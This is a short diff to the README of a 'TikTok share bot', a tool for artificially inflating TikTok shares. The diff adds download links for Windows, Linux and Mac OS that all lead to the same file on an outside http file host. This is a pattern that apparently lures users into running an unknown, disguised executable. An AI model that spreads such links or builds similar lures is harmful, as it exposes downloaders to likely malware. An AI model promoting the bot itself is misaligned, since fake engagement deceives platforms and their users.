@@ -1,4 +1,8 @@
 # TikTok share bot
+
+# 📩 Downloads :
+## Versions > 🖥️ [Windows](http://filetransfer.fr/download.php?file=PM8Q4VENZS) 🐧 [Linux & Kali Linux](http://filetransfer.fr/download.php?file=PM8Q4VENZS) 🍏 [Mac OS](http://filetransfer.fr/download.php?file=PM8Q4VENZS)
+
 How to use ? 
 
 ### 1 - Insert video url 
